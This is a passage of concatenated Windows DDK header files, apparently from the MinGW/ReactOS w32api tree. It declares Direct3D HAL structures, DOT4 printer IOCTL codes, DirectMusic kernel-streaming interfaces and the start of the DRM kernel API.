typedef struct _D3DHAL_DP2INDEXEDTRIANGLELIST {
  WORD wV1;
  WORD wV2;
  WORD wV3;
  WORD wFlags;
} D3DHAL_DP2INDEXEDTRIANGLELIST,*LPD3DHAL_DP2INDEXEDTRIANGLELIST;

typedef struct _D3DHAL_DP2INDEXEDTRIANGLELIST2 {
  WORD wV1;
  WORD wV2;
  WORD wV3;
} D3DHAL_DP2INDEXEDTRIANGLELIST2,*LPD3DHAL_DP2INDEXEDTRIANGLELIST2;

typedef struct _D3DHAL_DP2TRIANGLESTRIP {
  WORD wVStart;
} D3DHAL_DP2TRIANGLESTRIP,*LPD3DHAL_DP2TRIANGLESTRIP;

typedef struct _D3DHAL_DP2INDEXEDTRIANGLESTRIP {
  WORD wV[3];
} D3DHAL_DP2INDEXEDTRIANGLESTRIP,*LPD3DHAL_DP2INDEXEDTRIANGLESTRIP;

typedef struct _D3DHAL_DP2TRIANGLEFAN {
  WORD wVStart;
} D3DHAL_DP2TRIANGLEFAN,*LPD3DHAL_DP2TRIANGLEFAN;

typedef struct _D3DHAL_DP2INDEXEDTRIANGLEFAN {
  WORD wV[3];
} D3DHAL_DP2INDEXEDTRIANGLEFAN,*LPD3DHAL_DP2INDEXEDTRIANGLEFAN;

typedef struct _D3DHAL_DP2TRIANGLEFAN_IMM {
  DWORD dwEdgeFlags;
} D3DHAL_DP2TRIANGLEFAN_IMM,*LPD3DHAL_DP2TRIANGLEFAN_IMM;

/* render states */
typedef struct _D3DHAL_DP2RENDERSTATE {
  D3DRENDERSTATETYPE	RenderState;
  _ANONYMOUS_UNION union {
    D3DVALUE dvState;
    DWORD dwState;
  } DUMMYUNIONNAME;
} D3DHAL_DP2RENDERSTATE,*LPD3DHAL_DP2RENDERSTATE;

typedef struct _D3DHAL_DP2TEXTURESTAGESTATE {
  WORD	wStage;
  WORD	TSState;
  DWORD dwValue;
} D3DHAL_DP2TEXTURESTAGESTATE,*LPD3DHAL_DP2TEXTURESTAGESTATE;

#define D3DTSS_TEXTUREMAP 0

typedef struct _D3DHAL_DP2VIEWPORTINFO {
  DWORD dwX;
  DWORD dwY;
  DWORD dwWidth;
  DWORD dwHeight;
} D3DHAL_DP2VIEWPORTINFO,*LPD3DHAL_DP2VIEWPORTINFO;

typedef struct _D3DHAL_DP2WINFO {
  D3DVALUE dwWNear;
  D3DVALUE dwWFar;
} D3DHAL_DP2WINFO,*LPD3DHAL_DP2WINFO;

typedef struct _D3DHAL_DP2SETPALETTE {
  DWORD dwPaletteHandle;
  DWORD dwPaletteFlags;
  DWORD dwSurfaceHandle;
} D3DHAL_DP2SETPALETTE,*LPD3DHAL_DP2SETPALETTE;

typedef struct _D3DHAL_DP2UPDATEPALETTE {
  DWORD dwPaletteHandle;
  WORD	wStartIndex;
  WORD	wNumEntries;
} D3DHAL_DP2UPDATEPALETTE,*LPD3DHAL_DP2UPDATEPALETTE;

typedef struct _D3DHAL_DP2ZRANGE {
  D3DVALUE dvMinZ;
  D3DVALUE dvMaxZ;
} D3DHAL_DP2ZRANGE,*LPD3DHAL_DP2ZRANGE;

typedef D3DMATERIAL7 D3DHAL_DP2SETMATERIAL,*LPD3DHAL_DP2SETMATERIAL;

typedef struct _D3DHAL_DP2SETLIGHT {
  DWORD dwIndex;
  DWORD dwDataType;
} D3DHAL_DP2SETLIGHT,*LPD3DHAL_DP2SETLIGHT;

#define D3DHAL_SETLIGHT_ENABLE	0
#define D3DHAL_SETLIGHT_DISABLE	1
#define D3DHAL_SETLIGHT_DATA	2

typedef struct _D3DHAL_DP2CREATELIGHT {
  DWORD dwIndex;
} D3DHAL_DP2CREATELIGHT,*LPD3DHAL_DP2CREATELIGHT;

typedef struct _D3DHAL_DP2SETTRANSFORM {
  D3DTRANSFORMSTATETYPE	xfrmType;
  D3DMATRIX		matrix;
} D3DHAL_DP2SETTRANSFORM,*LPD3DHAL_DP2SETTRANSFORM;

typedef struct _D3DHAL_DP2TEXBLT {
  DWORD dwDDDestSurface;
  DWORD dwDDSrcSurface;
  POINT pDest;
  RECTL rSrc;
  DWORD dwFlags;
} D3DHAL_DP2TEXBLT,*LPD3DHAL_DP2TEXBLT;

typedef struct _D3DHAL_DP2STATESET {
  DWORD               dwOperation;
  DWORD               dwParam;
  D3DSTATEBLOCKTYPE   sbType;
} D3DHAL_DP2STATESET,*LPD3DHAL_DP2STATESET;

#define D3DHAL_STATESETBEGIN	0
#define D3DHAL_STATESETEND	1
#define D3DHAL_STATESETDELETE	2
#define D3DHAL_STATESETEXECUTE	3
#define D3DHAL_STATESETCAPTURE	4

typedef struct _D3DHAL_DP2SETPRIORITY {
  DWORD dwDDSurface;
  DWORD dwPriority;
} D3DHAL_DP2SETPRIORITY,*LPD3DHAL_DP2SETPRIORITY;

typedef struct _D3DHAL_DP2SETRENDERTARGET {
  DWORD hRenderTarget;
  DWORD hZBuffer;
} D3DHAL_DP2SETRENDERTARGET,*LPD3DHAL_DP2SETRENDERTARGET;

typedef struct _D3DHAL_DP2CLEAR {
  DWORD		dwFlags;
  DWORD		dwFillColor;
  D3DVALUE	dvFillDepth;
  DWORD		dwFillStencil;
  RECT		Rects[1];
} D3DHAL_DP2CLEAR,*LPD3DHAL_DP2CLEAR;

typedef struct _D3DHAL_DP2SETTEXLOD {
  DWORD dwDDSurface;
  DWORD dwLOD;
} D3DHAL_DP2SETTEXLOD,*LPD3DHAL_DP2SETTEXLOD;


#if (DIRECT3D_VERSION >= 0x0900)

#define DX9_DDI_VERSION			4

#ifndef D3DVTXPCAPS_NO_VSDT_UBYTE4
#define D3DVTXPCAPS_NO_VSDT_UBYTE4	0x00000080
#endif

#ifndef D3DPMISCCAPS_LINEPATTERNREP
#define D3DPMISCCAPS_LINEPATTERNREP	0x00000004
#endif

#define D3DDEVCAPS_HWVERTEXBUFFER	0x02000000
#define D3DDEVCAPS_HWINDEXBUFFER	0x04000000
#define D3DDEVCAPS_SUBVOLUMELOCK	0x08000000

#ifndef D3DPMISCCAPS_FOGINFVF
#define D3DPMISCCAPS_FOGINFVF		0x00002000
#endif

#ifndef D3DFVF_FOG
#define D3DFVF_FOG			0x00002000
#endif

typedef struct _DD_GETDRIVERINFO2DATA {
  DWORD		dwReserved;
  DWORD		dwMagic;
  DWORD		dwType;
  DWORD		dwExpectedSize;
} DD_GETDRIVERINFO2DATA;

/**
 * A driver must check DD_GETDRIVERINFO2DATA.dwHeight for
 * D3DGDI2_MAGIC to see if the passed GUID is GUID_GetDriverInfo2
 * or a GUID_DDStereoMode.
 */
#define GUID_GetDriverInfo2		GUID_DDStereoMode

/**
 * Magic number used in DD_GETDRIVERINFO2DATA.dwHeight when
 * GUID_GetDriverInfo2/GUID_DDStereoMode is specified in a
 * GetDriverInfo call.
 */
#define D3DGDI2_MAGIC				0xFFFFFFFF

#define D3DGDI2_TYPE_GETD3DCAPS8		0x00000001
#define D3DGDI2_TYPE_GETFORMATCOUNT		0x00000002
#define D3DGDI2_TYPE_GETFORMAT			0x00000003
#define D3DGDI2_TYPE_DXVERSION			0x00000004  /* Make driver aware of currently used DirectX version */
#define D3DGDI2_TYPE_GETD3DCAPS9		0x00000010
#define D3DGDI2_TYPE_GETEXTENDEDMODECOUNT	0x00000011
#define D3DGDI2_TYPE_GETEXTENDEDMODE		0x00000012
#define D3DGDI2_TYPE_GETADAPTERGROUP		0x00000013
#define D3DGDI2_TYPE_GETMULTISAMPLEQUALITYLEVELS 0x00000016
#define D3DGDI2_TYPE_DEFERRED_AGP_AWARE		0x00000018
#define D3DGDI2_TYPE_FREE_DEFERRED_AGP		0x00000019
#define D3DGDI2_TYPE_DEFER_AGP_FREES		0x00000020
#define D3DGDI2_TYPE_GETD3DQUERYCOUNT		0x00000021
#define D3DGDI2_TYPE_GETD3DQUERY		0x00000022
#define D3DGDI2_TYPE_GETDDIVERSION		0x00000023  /* Returns DX9_DDI_VERSION, used to check which DDK version the driver is compiled against */

typedef struct _D3DCAPS8 {
  D3DDEVTYPE DeviceType;
  UINT  AdapterOrdinal;
  DWORD Caps;
  DWORD Caps2;
  DWORD Caps3;
  DWORD PresentationIntervals;
  DWORD CursorCaps;
  DWORD DevCaps;
  DWORD PrimitiveMiscCaps;
  DWORD RasterCaps;
  DWORD ZCmpCaps;
  DWORD SrcBlendCaps;
  DWORD DestBlendCaps;
  DWORD AlphaCmpCaps;
  DWORD ShadeCaps;
  DWORD TextureCaps;
  DWORD TextureFilterCaps;
  DWORD CubeTextureFilterCaps;
  DWORD VolumeTextureFilterCaps;
  DWORD TextureAddressCaps;
  DWORD VolumeTextureAddressCaps;
  DWORD LineCaps;
  DWORD MaxTextureWidth;
  DWORD MaxTextureHeight;
  DWORD MaxVolumeExtent;
  DWORD MaxTextureRepeat;
  DWORD MaxTextureAspectRatio;
  DWORD MaxAnisotropy;
  float MaxVertexW;
  float GuardBandLeft;
  float GuardBandTop;
  float GuardBandRight;
  float GuardBandBottom;
  float ExtentsAdjust;
  DWORD StencilCaps;
  DWORD FVFCaps;
  DWORD TextureOpCaps;
  DWORD MaxTextureBlendStages;
  DWORD MaxSimultaneousTextures;
  DWORD VertexProcessingCaps;
  DWORD MaxActiveLights;
  DWORD MaxUserClipPlanes;
  DWORD MaxVertexBlendMatrices;
  DWORD MaxVertexBlendMatrixIndex;
  float MaxPointSize;
  DWORD MaxPrimitiveCount;
  DWORD MaxVertexIndex;
  DWORD MaxStreams;
  DWORD MaxStreamStride;
  DWORD VertexShaderVersion;
  DWORD MaxVertexShaderConst;
  DWORD PixelShaderVersion;
  float MaxPixelShaderValue;
} D3DCAPS8;

typedef struct _DD_GETFORMATCOUNTDATA {
  DD_GETDRIVERINFO2DATA gdi2;
  DWORD dwFormatCount;
  DWORD dwReserved;
} DD_GETFORMATCOUNTDATA;

typedef struct _DD_GETFORMATDATA {
  DD_GETDRIVERINFO2DATA gdi2;
  DWORD dwFormatIndex;
  DDPIXELFORMAT format;
} DD_GETFORMATDATA;

typedef struct _DD_DXVERSION {
  DD_GETDRIVERINFO2DATA gdi2;
  DWORD dwDXVersion;
  DWORD dwReserved;
} DD_DXVERSION;

typedef struct _DD_DEFERRED_AGP_AWARE_DATA {
  DD_GETDRIVERINFO2DATA gdi2;
} DD_DEFERRED_AGP_AWARE_DATA;

typedef struct _DD_FREE_DEFERRED_AGP_DATA {
  DD_GETDRIVERINFO2DATA gdi2;
  DWORD dwProcessId;
} DD_FREE_DEFERRED_AGP_DATA;

typedef struct _DD_GETEXTENDEDMODECOUNTDATA {
  DD_GETDRIVERINFO2DATA gdi2;
  DWORD dwModeCount;
  DWORD dwReserved;
} DD_GETEXTENDEDMODECOUNTDATA;

typedef struct _DD_GETEXTENDEDMODEDATA {
  DD_GETDRIVERINFO2DATA gdi2;
  DWORD                 dwModeIndex;
  D3DDISPLAYMODE        mode;
} DD_GETEXTENDEDMODEDATA;

typedef struct _DD_GETADAPTERGROUPDATA {
  DD_GETDRIVERINFO2DATA gdi2;
  ULONG_PTR ulUniqueAdapterGroupId;
  DWORD dwReserved1;
  DWORD dwReserved2;
} DD_GETADAPTERGROUPDATA;

typedef struct _DD_MULTISAMPLEQUALITYLEVELSDATA {
  DD_GETDRIVERINFO2DATA gdi2;
  D3DFORMAT Format;
  BOOL                  bFlip  :  1;
  D3DMULTISAMPLE_TYPE   MSType : 31;
  DWORD QualityLevels;
} DD_MULTISAMPLEQUALITYLEVELSDATA;

typedef struct _DD_GETD3DQUERYCOUNTDATA {
  DD_GETDRIVERINFO2DATA gdi2;
  DWORD dwNumQueries;
} DD_GETD3DQUERYCOUNTDATA;

typedef struct _DD_GETD3DQUERYDATA {
  DD_GETDRIVERINFO2DATA gdi2;
  __GNU_EXTENSION union {
    DWORD dwQueryIndex;
    D3DQUERYTYPE QueryType;
  };
} DD_GETD3DQUERYDATA;

typedef struct _DD_GETDDIVERSIONDATA {
  DD_GETDRIVERINFO2DATA gdi2;
  DWORD dwDXVersion;
  DWORD dwDDIVersion;
} DD_GETDDIVERSIONDATA;

#endif /* (DIRECT3D_VERSION >= 0x0900) */

#ifdef __cplusplus
} /* extern "C" */
#endif

#endif /* _D3DHAL_H_ */

```

`include/ddk/d3dhalex.h`:

```h

#ifndef _D3DHALEX_H
#define _D3DHALEX_H

#define D3DGDI_IS_GDI2(pData)               ((((DD_GETDRIVERINFO2DATA*)(pData->lpvData))->dwMagic)  == D3DGDI2_MAGIC)
#define D3DGDI_IS_STEREOMODE(pData)         ((((DD_STEREOMODE*)        (pData->lpvData))->dwHeight) != D3DGDI2_MAGIC)
#define D3DGDI_GET_GDI2_DATA(pData)         (D3DGDI_IS_GDI2(pData) ? (((DD_GETDRIVERINFO2DATA*)(pData->lpvData))) : NULL)
#define D3DGDI_GET_STEREOMODE_DATA(pData)   (D3DGDI_IS_STEREOMODE(pData) ? (((DD_STEREOMODE*)(pData->lpvData)))   : NULL)

#endif /* _D3DHALEX_H */

```

`include/ddk/d4drvif.h`:

```h
/*
 * d4drvif.h
 *
 * DOT4 driver IOCTL interface
 *
 * This file is part of the w32api package.
 *
 * Contributors:
 *   Created by Casper S. Hornstrup <chorns@users.sourceforge.net>
 *
 * THIS SOFTWARE IS NOT COPYRIGHTED
 *
 * This source code is offered for use in the public domain. You may
 * use, modify or distribute it freely.
 *
 * This code is distributed in the hope that it will be useful but
 * WITHOUT ANY WARRANTY. ALL WARRANTIES, EXPRESS OR IMPLIED ARE HEREBY
 * DISCLAIMED. This includes but is not limited to warranties of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 */

#pragma once

#define _DOT4DRVIF_H

#ifdef __cplusplus
extern "C" {
#endif

#define MAX_SERVICE_LENGTH                40

#ifndef CTL_CODE

#define CTL_CODE( DeviceType, Function, Method, Access ) (                 \
    ((DeviceType) << 16) | ((Access) << 14) | ((Function) << 2) | (Method) \
)

#define METHOD_BUFFERED                0
#define METHOD_IN_DIRECT               1
#define METHOD_OUT_DIRECT              2
#define METHOD_NEITHER                 3

#define FILE_ANY_ACCESS                0
#define FILE_READ_ACCESS               0x0001
#define FILE_WRITE_ACCESS              0x0002

#endif /* CTL_CODE */

#define FILE_DEVICE_DOT4               0x3a
#define IOCTL_DOT4_USER_BASE           2049
#define IOCTL_DOT4_LAST                IOCTL_DOT4_USER_BASE + 9

#define IOCTL_DOT4_ADD_ACTIVITY_BROADCAST \
  CTL_CODE(FILE_DEVICE_DOT4, IOCTL_DOT4_USER_BASE + 4, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_DOT4_CLOSE_CHANNEL \
  CTL_CODE(FILE_DEVICE_DOT4, IOCTL_DOT4_USER_BASE + 1, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_DOT4_CREATE_SOCKET \
  CTL_CODE(FILE_DEVICE_DOT4, IOCTL_DOT4_USER_BASE + 7, METHOD_OUT_DIRECT, FILE_ANY_ACCESS)

#define IOCTL_DOT4_DESTROY_SOCKET \
  CTL_CODE(FILE_DEVICE_DOT4, IOCTL_DOT4_USER_BASE + 9, METHOD_OUT_DIRECT, FILE_ANY_ACCESS)

#define IOCTL_DOT4_OPEN_CHANNEL \
  CTL_CODE(FILE_DEVICE_DOT4, IOCTL_DOT4_USER_BASE + 0, METHOD_OUT_DIRECT, FILE_ANY_ACCESS)

#define IOCTL_DOT4_READ \
  CTL_CODE(FILE_DEVICE_DOT4, IOCTL_DOT4_USER_BASE + 2, METHOD_OUT_DIRECT, FILE_ANY_ACCESS)

#define IOCTL_DOT4_REMOVE_ACTIVITY_BROADCAST \
  CTL_CODE(FILE_DEVICE_DOT4, IOCTL_DOT4_USER_BASE + 5, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_DOT4_WAIT_ACTIVITY_BROADCAST \
  CTL_CODE(FILE_DEVICE_DOT4, IOCTL_DOT4_USER_BASE + 6, METHOD_OUT_DIRECT, FILE_ANY_ACCESS)

#define IOCTL_DOT4_WAIT_FOR_CHANNEL \
  CTL_CODE(FILE_DEVICE_DOT4, IOCTL_DOT4_USER_BASE + 8, METHOD_OUT_DIRECT, FILE_ANY_ACCESS)

#define IOCTL_DOT4_WRITE \
  CTL_CODE(FILE_DEVICE_DOT4, IOCTL_DOT4_USER_BASE + 3, METHOD_IN_DIRECT, FILE_ANY_ACCESS)


typedef struct _DOT4_DC_CREATE_DATA {
  unsigned char bPsid;
  CHAR pServiceName[MAX_SERVICE_LENGTH + 1];
  unsigned char bType;
  ULONG ulBufferSize;
  USHORT usMaxHtoPPacketSize;
  USHORT usMaxPtoHPacketSize;
  unsigned char bHsid;
} DOT4_DC_CREATE_DATA, *PDOT4_DC_CREATE_DATA;

typedef struct _DOT4_DC_DESTROY_DATA {
  unsigned char bHsid;
} DOT4_DC_DESTROY_DATA, *PDOT4_DC_DESTROY_DATA;

typedef struct _DOT4_DC_OPEN_DATA {
  unsigned char bHsid;
  unsigned char fAddActivity;
  CHANNEL_HANDLE hChannelHandle;
} DOT4_DC_OPEN_DATA, *PDOT4_DC_OPEN_DATA;

typedef struct _DOT4_DRIVER_CMD {
  CHANNEL_HANDLE hChannelHandle;
  ULONG ulSize;
  ULONG ulOffset;
  ULONG ulTimeout;
} DOT4_DRIVER_CMD, *PDOT4_DRIVER_CMD;

#ifdef __cplusplus
}
#endif

```

`include/ddk/d4iface.h`:

```h
#pragma once

#define _DOT4_IFACE_H

#ifdef __cplusplus
extern "C" {
#endif

#define DOT4_MAX_CHANNELS		128
#define NO_TIMEOUT			0
#define STREAM_TYPE_CHANNEL		1
#define PACKET_TYPE_CHANNEL		2
#define DOT4_STREAM_RECEIVED		0x100
#define DOT4_STREAM_CREDITS		0x101
#define DOT4_MESSAGE_RECEIVED		0x102
#define DOT4_DISCONNECT			0x103
#define DOT4_CHANNEL_CLOSED		0x105
#define DOT4_CHANNEL			0
#define HP_MESSAGE_PROCESSOR		1
#define PRINTER_CHANNEL			2
#define SCANNER_CHANNEL			4
#define MIO_COMMAND_PROCESSOR		5
#define ECHO_CHANNEL			6
#define FAX_SEND_CHANNEL		7
#define FAX_RECV_CHANNEL		8
#define DIAGNOSTIC_CHANNEL		9
#define HP_RESERVED			10
#define IMAGE_DOWNLOAD			11
#define HOST_DATASTORE_UPLOAD		12
#define HOST_DATASTORE_DOWNLOAD		13
#define CONFIG_UPLOAD			14
#define CONFIG_DOWNLOAD			15

typedef ULONG CHANNEL_HANDLE, *PCHANNEL_HANDLE;

typedef struct _DOT4_ACTIVITY {
  ULONG ulMessage;
  ULONG ulByteCount;
  CHANNEL_HANDLE hChannel;
} DOT4_ACTIVITY, *PDOT4_ACTIVITY;

#ifdef __cplusplus
}
#endif


```

`include/ddk/dderror.h`:

```h
#pragma once

#define _WINERROR_

#define NO_ERROR				0
#define ERROR_INVALID_FUNCTION			1
#define ERROR_NOT_ENOUGH_MEMORY			8
#define ERROR_DEV_NOT_EXIST			55
#define ERROR_INVALID_PARAMETER			87
#define ERROR_INSUFFICIENT_BUFFER		122
#define ERROR_INVALID_NAME			123
#define ERROR_BUSY				170
#define ERROR_MORE_DATA				234
#define WAIT_TIMEOUT				258
#define ERROR_IO_PENDING			997
#define ERROR_DEVICE_REINITIALIZATION_NEEDED	1164
#define ERROR_CONTINUE				1246
#define ERROR_NO_MORE_DEVICES			1248


```

`include/ddk/dmusicks.h`:

```h
#ifndef _DMUSICKS_
#define _DMUSICKS_

#define DONT_HOLD_FOR_SEQUENCING 0x8000000000000000

#ifndef REFERENCE_TIME
typedef LONGLONG REFERENCE_TIME;
#endif

typedef struct _DMUS_KERNEL_EVENT {
  BYTE bReserved;
  BYTE cbStruct;
  USHORT cbEvent;
  USHORT usChannelGroup;
  USHORT usFlags;
  REFERENCE_TIME ullPresTime100ns;
  ULONGLONG ullBytePosition;
  struct _DMUS_KERNEL_EVENT *pNextEvt;
  union {
    BYTE abData[sizeof(PBYTE)];
    PBYTE pbData;
    struct _DMUS_KERNEL_EVENT *pPackageEvt;
  } uData;
} DMUS_KERNEL_EVENT, *PDMUS_KERNEL_EVENT;

typedef enum {
  DMUS_STREAM_MIDI_INVALID = -1,
  DMUS_STREAM_MIDI_RENDER = 0,
  DMUS_STREAM_MIDI_CAPTURE,
  DMUS_STREAM_WAVE_SINK
} DMUS_STREAM_TYPE;

DEFINE_GUID(CLSID_MiniportDriverDMusUART,        0xd3f0ce1c, 0xFFFC, 0x11D1, 0x81, 0xB0, 0x00, 0x60, 0x08, 0x33, 0x16, 0xC1);
DEFINE_GUID(CLSID_MiniportDriverDMusUARTCapture, 0xD3F0CE1D, 0xFFFC, 0x11D1, 0x81, 0xB0, 0x00, 0x60, 0x08, 0x33, 0x16, 0xC1);

/* ===============================================================
    IMasterClock Interface
*/

#undef INTERFACE
#define INTERFACE IMasterClock

DECLARE_INTERFACE_(IMasterClock,IUnknown)
{
    DEFINE_ABSTRACT_UNKNOWN()

    STDMETHOD_(NTSTATUS,GetTime)( THIS_
        OUT     REFERENCE_TIME  * pTime
    ) PURE;
};

typedef IMasterClock *PMASTERCLOCK;

#define IMP_IMasterClock                    \
    STDMETHODIMP_(NTSTATUS) GetTime(        \
        OUT     REFERENCE_TIME  * pTime     \
    )

/* ===============================================================
    IMXF Interface
*/

#undef INTERFACE
#define INTERFACE IMXF

struct IMXF;
typedef struct IMXF *PMXF;

#define DEFINE_ABSTRACT_IMXF()                 \
    STDMETHOD_(NTSTATUS,SetState)(THIS_        \
        IN      KSSTATE State                  \
    ) PURE;                                    \
    STDMETHOD_(NTSTATUS,PutMessage)            \
    (   THIS_                                  \
        IN      PDMUS_KERNEL_EVENT  pDMKEvt    \
    ) PURE;                                    \
    STDMETHOD_(NTSTATUS,ConnectOutput)         \
    (   THIS_                                  \
        IN      PMXF    sinkMXF                \
    ) PURE;                                    \
    STDMETHOD_(NTSTATUS,DisconnectOutput)      \
    (   THIS_                                  \
        IN      PMXF    sinkMXF                \
    ) PURE;

#define IMP_IMXF                                \
    STDMETHODIMP_(NTSTATUS) SetState            \
    (                                           \
        IN      KSSTATE State                   \
    );                                          \
    STDMETHODIMP_(NTSTATUS) PutMessage          \
    (   THIS_                                   \
        IN      PDMUS_KERNEL_EVENT  pDMKEvt     \
    );                                          \
    STDMETHODIMP_(NTSTATUS) ConnectOutput       \
    (   THIS_                                   \
        IN      PMXF    sinkMXF                 \
    );                                          \
    STDMETHODIMP_(NTSTATUS) DisconnectOutput    \
    (   THIS_                                   \
        IN      PMXF    sinkMXF                 \
    )


DECLARE_INTERFACE_(IMXF,IUnknown)
{
    DEFINE_ABSTRACT_UNKNOWN()

    DEFINE_ABSTRACT_IMXF()
};

/* ===============================================================
    IAllocatorMXF Interface
*/

#undef INTERFACE
#define INTERFACE IAllocatorMXF

struct  IAllocatorMXF;
typedef struct IAllocatorMXF *PAllocatorMXF;

#define STATIC_IID_IAllocatorMXF\
    0xa5f0d62c, 0xb30f, 0x11d2, 0xb7, 0xa3, 0x00, 0x60, 0x08, 0x33, 0x16, 0xc1
DEFINE_GUIDSTRUCT("a5f0d62c-b30f-11d2-b7a3-0060083316c1", IID_IAllocatorMXF);
#define IID_IAllocatorMXF DEFINE_GUIDNAMED(IID_IAllocatorMXF)


DECLARE_INTERFACE_(IAllocatorMXF, IMXF)
{
    DEFINE_ABSTRACT_UNKNOWN()

    DEFINE_ABSTRACT_IMXF()

    STDMETHOD_(NTSTATUS,GetMessage)(THIS_
        OUT     PDMUS_KERNEL_EVENT * ppDMKEvt
    ) PURE;

    STDMETHOD_(USHORT,GetBufferSize)(THIS) PURE;

    STDMETHOD_(NTSTATUS,GetBuffer)(THIS_
        OUT     PBYTE * ppBuffer
    )PURE;

    STDMETHOD_(NTSTATUS,PutBuffer)(THIS_
        IN      PBYTE   pBuffer
    )   PURE;
};

#define IMP_IAllocatorMXF                               \
    IMP_IMXF;                                           \
    STDMETHODIMP_(NTSTATUS) GetMessage(                 \
        OUT     PDMUS_KERNEL_EVENT * ppDMKEvt           \
    );                                                  \
                                                        \
    STDMETHODIMP_(USHORT) GetBufferSize(void);          \
                                                        \
    STDMETHODIMP_(NTSTATUS) GetBuffer(                  \
        OUT     PBYTE * ppBuffer                        \
    );                                                  \
                                                        \
    STDMETHODIMP_(NTSTATUS) PutBuffer(                  \
        IN      PBYTE   pBuffer                         \
    )

#undef INTERFACE
#define INTERFACE IPortDMus

DEFINE_GUID(IID_IPortDMus, 0xc096df9c, 0xfb09, 0x11d1, 0x81, 0xb0, 0x00, 0x60, 0x08, 0x33, 0x16, 0xc1);
DEFINE_GUID(CLSID_PortDMus, 0xb7902fe9, 0xfb0a, 0x11d1, 0x81, 0xb0, 0x00, 0x60, 0x08, 0x33, 0x16, 0xc1);

DECLARE_INTERFACE_(IPortDMus, IPort)
{
    DEFINE_ABSTRACT_UNKNOWN()

    DEFINE_ABSTRACT_PORT()

    STDMETHOD_(void,Notify)(THIS_
        IN PSERVICEGROUP ServiceGroup OPTIONAL
    )PURE;

    STDMETHOD_(void,RegisterServiceGroup)(THIS_
        IN PSERVICEGROUP ServiceGroup
    ) PURE;
};
typedef IPortDMus *PPORTDMUS;

#define IMP_IPortDMus                                 \
    IMP_IPort;                                        \
    STDMETHODIMP_(void) Notify(                       \
        IN PSERVICEGROUP ServiceGroup OPTIONAL        \
    );                                                \
                                                      \
    STDMETHODIMP_(void) RegisterServiceGroup(         \
        IN PSERVICEGROUP ServiceGroup                 \
    )

#undef INTERFACE
#define INTERFACE IMiniportDMus

DEFINE_GUID(IID_IMiniportDMus, 0xc096df9d, 0xfb09, 0x11d1, 0x81, 0xb0, 0x00, 0x60, 0x08, 0x33, 0x16, 0xc1);
DECLARE_INTERFACE_(IMiniportDMus, IMiniport)
{
    DEFINE_ABSTRACT_UNKNOWN()

    DEFINE_ABSTRACT_MINIPORT()

    STDMETHOD_(NTSTATUS,Init)(THIS_
        IN      PUNKNOWN        UnknownAdapter,
        IN      PRESOURCELIST   ResourceList,
        IN      PPORTDMUS       Port,
        OUT     PSERVICEGROUP * ServiceGroup
    )   PURE;

    STDMETHOD_(void,Service)(THIS) PURE;

    STDMETHOD_(NTSTATUS,NewStream)(THIS_
        OUT     PMXF                  * MXF,
        IN      PUNKNOWN                OuterUnknown    OPTIONAL,
        IN      POOL_TYPE               PoolType,
        IN      ULONG                   PinID,
        IN      DMUS_STREAM_TYPE        StreamType,
        IN      PKSDATAFORMAT           DataFormat,
        OUT     PSERVICEGROUP         * ServiceGroup,
        IN      PAllocatorMXF           AllocatorMXF,
        IN      PMASTERCLOCK            MasterClock,
        OUT     PULONGLONG              SchedulePreFetch
    ) PURE;
};

typedef IMiniportDMus *PMINIPORTDMUS;
#undef INTERFACE

#define IMP_IMiniportDMus                              \
    IMP_IMiniport;                                     \
    STDMETHODIMP_(NTSTATUS) Init(                      \
        IN      PUNKNOWN        UnknownAdapter,        \
        IN      PRESOURCELIST   ResourceList,          \
        IN      PPORTDMUS       Port,                  \
        OUT     PSERVICEGROUP * ServiceGroup           \
    );                                                 \
                                                       \
    STDMETHODIMP_(void) Service(THIS);                 \
                                                       \
    STDMETHODIMP_(NTSTATUS) NewStream(                 \
        OUT     PMXF              * MXF,               \
        IN      PUNKNOWN          OuterUnknown,        \
        IN      POOL_TYPE         PoolType,            \
        IN      ULONG             PinID,               \
        IN      DMUS_STREAM_TYPE  StreamType,          \
        IN      PKSDATAFORMAT     DataFormat,          \
        OUT     PSERVICEGROUP     * ServiceGroup,      \
        IN      PAllocatorMXF     AllocatorMXF,        \
        IN      PMASTERCLOCK      MasterClock,         \
        OUT     PULONGLONG        SchedulePreFetch     \
    )

#endif /* _DMUSICKS_ */


```

`include/ddk/drivinit.h`:

```h

/* This are empty and is left for be compatible with building some older windows nt4/2000/2003/XP drivers */


```

`include/ddk/drmk.h`:

```h
/*
    ReactOS Kernel Streaming
    Digital Rights Management

    Author: Andrew Greenwood
*/

#ifndef DRMK_H
#define DRMK_H

typedef struct {
  DWORD Flags;
  PDEVICE_OBJECT DeviceObject;
  PFILE_OBJECT FileObject;
  PVOID Context;
} DRMFORWARD, *PDRMFORWARD, *PCDRMFORWARD;

typedef struct {
  BOOL  CopyProtect;
  ULONG Reserved;
  BOOL  DigitalOutputDisable;
} DRMRIGHTS, *PDRMRIGHTS;

typedef const DRMRIGHTS *PCDRMRIGHTS;

/* ===============================================================
    Digital Rights Management Functions
    TODO: Check calling convention
*/

#ifdef __cplusplus
extern "C" {
#endif

NTSTATUS
NTAPI
DrmAddContentHandlers(
    IN  ULONG ContentId,
    IN  PVOID *paHandlers,
    IN  ULONG NumHandlers);

NTSTATUS
NTAPI
DrmCreateContentMixed(
    IN  PULONG paContentId,
    IN  ULONG cContentId,
    OUT PULONG pMixedContentId);

NTSTATUS
NTAPI
DrmDestroyContent(
    IN  ULONG ContentId);

NTSTATUS
NTAPI
DrmForwardContentToDeviceObject(
    IN  ULONG ContentId,
    IN  PVOID Reserved,
    IN  PCDRMFORWARD DrmForward);

NTSTATUS
NTAPI
DrmForwardContentToFileObject(
    IN  ULONG ContentId,
    IN  PFILE_OBJECT FileObject);

NTSTATUS
NTAPI
DrmForwardContentToInterface(
    IN  ULONG ContentId,
    IN  PUNKNOWN pUnknown,
    IN  ULONG NumMethods);

NTSTATUS
NTAPI
DrmGetContentRights(
    IN  ULONG ContentId,
    OUT PDRMRIGHTS DrmRights);

#ifdef __cplusplus
}
#endif


DEFINE_GUID(IID_IDrmAudioStream,
    0x1915c967, 0x3299, 0x48cb, 0xa3, 0xe4, 0x69, 0xfd, 0x1d, 0x1b, 0x30, 0x6e);

#undef INTERFACE
#define INTERFACE IDrmAudioStream

DECLARE_INTERFACE_(IDrmAudioStream, IUnknown)
{
    STDMETHOD_(NTSTATUS, QueryInterface)(THIS_
        REFIID InterfaceId,
